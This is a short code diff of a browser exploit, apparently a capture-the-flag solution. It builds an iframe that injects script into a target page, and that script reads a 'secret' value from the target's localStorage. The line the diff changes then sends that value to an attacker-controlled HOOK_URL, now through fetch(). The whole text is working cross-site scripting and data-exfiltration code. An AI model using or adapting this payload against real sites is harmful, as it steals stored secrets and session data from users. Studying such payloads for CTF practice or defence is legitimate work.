@@ -8,7 +8,7 @@ const elm = document.createElement("iframe");
 elm.src = `${TARGET_BASE_URL}?p=${encodeURIComponent(`
   const w = open("${TARGET_BASE_URL}");
   const flag = w.localStorage.getItem("secret");
-  location = "${HOOK_URL}?q=" + flag;
+  fetch("${HOOK_URL}?q="+flag);
 `)}`;
 document.body.appendChild(elm);
 </script>
